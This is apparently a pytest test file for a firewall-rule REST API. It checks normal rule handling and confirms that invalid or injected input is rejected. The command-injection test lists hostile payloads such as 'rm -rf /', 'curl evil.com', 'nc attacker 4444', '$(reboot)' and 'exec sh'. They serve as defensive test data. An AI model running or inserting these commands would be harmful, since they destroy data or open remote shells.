"""Tests for /api/firewall/* endpoints.

Coverage:
- happy path: add -> list -> delete -> list -> clear
- security: invalid proto / action / IP / port + shell injection attempts
"""

from __future__ import annotations

import pytest


VALID_RULE = {
    "proto": "tcp",
    "src": "0.0.0.0/0",
    "dst": "192.168.1.1",
    "port": 8080,
    "action": "drop",
}


def test_list_seeded_from_mock_file(client):
    resp = client.get("/api/firewall/rules")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["ok"] is True
    assert len(data["rules"]) >= 2


def test_add_then_list_includes_new_rule(client):
    resp = client.post("/api/firewall/rules", json=VALID_RULE)
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["ok"] is True
    assert data["code"] == 0
    rule_id = data["ruleId"]

    listed = client.get("/api/firewall/rules").get_json()["rules"]
    assert any(r["id"] == rule_id for r in listed)


def test_delete_existing_rule(client):
    added = client.post("/api/firewall/rules", json=VALID_RULE).get_json()
    rule_id = added["ruleId"]

    resp = client.delete(f"/api/firewall/rules/{rule_id}")
    assert resp.status_code == 200
    assert resp.get_json()["ok"] is True

    listed = client.get("/api/firewall/rules").get_json()["rules"]
    assert all(r["id"] != rule_id for r in listed)


def test_delete_unknown_returns_404(client):
    resp = client.delete("/api/firewall/rules/nope-9999")
    assert resp.status_code == 404
    assert resp.get_json()["ok"] is False


def test_clear_empties_rules(client):
    resp = client.post("/api/firewall/clear")
    assert resp.status_code == 200
    assert resp.get_json()["ok"] is True

    listed = client.get("/api/firewall/rules").get_json()["rules"]
    assert listed == []


# ---------- security: rejection cases ----------

@pytest.mark.parametrize(
    "bad_proto",
    ["sctp", "TCPP", "", "ip", "1"],
)
def test_reject_invalid_proto(client, bad_proto):
    payload = {**VALID_RULE, "proto": bad_proto}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422
    body = resp.get_json()
    assert body["ok"] is False
    assert body["field"] == "proto"


@pytest.mark.parametrize(
    "bad_action",
    ["log", "permit", "ACCEPTALL", "", " "],
)
def test_reject_invalid_action(client, bad_action):
    payload = {**VALID_RULE, "action": bad_action}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422
    assert resp.get_json()["field"] == "action"


@pytest.mark.parametrize(
    "bad_ip",
    ["999.1.1.1", "10.0.0", "not-an-ip", "192.168.1.0/40", ""],
)
def test_reject_invalid_src_ip(client, bad_ip):
    payload = {**VALID_RULE, "src": bad_ip}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422


@pytest.mark.parametrize(
    "bad_port",
    [0, -1, 65536, 99999, "abc", 1.5, True],
)
def test_reject_invalid_port(client, bad_port):
    payload = {**VALID_RULE, "port": bad_port}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422
    assert resp.get_json()["field"] == "port"


@pytest.mark.parametrize(
    "field, malicious",
    [
        ("src", "0.0.0.0; rm -rf /"),
        ("dst", "192.168.1.1 && curl evil.com"),
        ("src", "127.0.0.1|nc attacker 4444"),
        ("dst", "$(reboot)"),
        ("src", "`whoami`"),
        ("dst", "1.1.1.1\nrm -rf /"),
        ("proto", "tcp; touch /tmp/pwn"),
        ("action", "drop && exec sh"),
    ],
)
def test_reject_command_injection(client, field, malicious):
    payload = {**VALID_RULE, field: malicious}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422
    body = resp.get_json()
    assert body["ok"] is False
    assert "message" in body


def test_reject_missing_field(client):
    payload = dict(VALID_RULE)
    del payload["port"]
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 422
    assert resp.get_json()["field"] == "port"


def test_reject_non_object_body(client):
    resp = client.post(
        "/api/firewall/rules",
        data="[]",
        content_type="application/json",
    )
    assert resp.status_code == 422


def test_any_keyword_is_accepted(client):
    payload = {**VALID_RULE, "src": "any", "dst": "any"}
    resp = client.post("/api/firewall/rules", json=payload)
    assert resp.status_code == 200
